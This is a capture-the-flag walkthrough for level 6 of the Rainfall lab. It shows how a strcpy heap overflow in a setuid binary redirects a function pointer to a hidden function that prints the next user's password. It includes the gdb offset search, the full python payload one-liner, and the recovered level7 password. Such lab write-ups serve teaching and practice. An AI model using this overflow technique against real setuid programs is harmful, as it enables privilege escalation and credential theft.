# Rainfall Level 6 Guide
This guide will walk you through the process of finding the password for the `level6` user.

## 1. Examine your environment
   
`id` : Shows user and group identities that you have.
```bash
uid=2064(level6) gid=2064(level6) groups=2064(level6),100(users)
```
`pwd` : Displays the current directory you are in.
```bash
/home/user/level6
```
`ls -la` : Lists files and their permissions in the current directory.
```bash
-rwsr-s---+ 1 level7 users  5274 Mar  6  2016 level6
```

We can see that the `level6` binary has the `setuid` bit set, which means that it runs with the permissions of the owner of the file. In this case, the owner is `level7`. It executable by the `users` group, our current group.

We execute the binary to see what it does. It segfaults.
```bash
level6@RainFall:~$ ./level6
Segmentation fault (core dumped)
```
With an argument, it prints `Nope`.
```bash
level6@RainFall:~$ ./level6 test
Nope
```

## 2. Reverse engineering

We will use Ghidra to reverse engineer the binary.
You can find the analysis in [Ressources/ghidra_analyse_level6.c](Ressources/ghidra_analyse_level6.c), and the reconstructed C code in [source.c](source.c).

## 3. Analysis

We find a main function, that declares two variables, `dest` and `func`.
`dest` is a 64 bytes buffer, and `func` is a pointer to a function that takes no arguments and returns nothing.

```c
int main(int ac, char **av)
{
    char *dest;
    function_ptr *func;

    dest = (char *)malloc(64);
    func = (function_ptr *)malloc(4);
    *func = m;
    strcpy(dest, av[1]);
    (**func)();
    return(0);
}
```

`func` is set to the address of the function `m`, that prints `Nope`.
```c
void m(void)
{
    puts("Nope");
    return;
}
```
`dest` is copied from the first argument with `strcpy`.
Then, the function pointed by `func` is called with `(**func)();`, so `m` is called.

With Ghidra, we can see another function, `n`, that calls `system("/bin/cat /home/user/level7/.pass");`. But it is never called in our main function.
```c
void n(void)
{
    system("/bin/cat /home/user/level7/.pass");
    return;
}
```
We will try to execute the `n` function.

## 4. Find the `n` function address

We will use `objdump` to find the address of the `n` function. We can user `grep` to search the `n` char, or we can user `less` and search `n` with `/n`.
```bash
level6@RainFall:~$ objdump -d ./level6 | grep n
08048454 <n>:
```
We found the address of the `n` function: `0x08048454`.

## 5. Exploitation

### 5.1. Find the offset

The program call `strcpy(dest, av[1]);` without checking the size of the buffer `dest`. We can overflow the buffer and try to search the `eip` address to overwrite it with the address of the `n` function.

We generate a pattern with `Wiremask` and send it to the program.
```bash
level6@RainFall:~$ gdb ./level6
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9

Program received signal SIGSEGV, Segmentation fault.
```
Now, we can check the `eip` value.
```bash
(gdb) info register eip
eip            0x41346341	0x41346341
```
The `eip` value is `0x41346341`. We can indicate this value to `Wiremask` to find the offset. `Wiremask` return `72`.

### 5.2. Overwrite the `eip`

We will overwrite the `eip` with the address of the `n` function.
The offset is `72`, and the address of the `n` function is `0x08048454`.
`0x08048454` in little-endian is `"\x54\x84\x04\x08"`.
So we can construct our payload with 72 bytes of padding and the address of the `n` function after.
```bash
level6@RainFall:~$ ./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

Congratulations!
We can now connect to the `level7` user with this password.
```bash
level6@RainFall:~$ su level7
Password:
level7@RainFall:~$
```
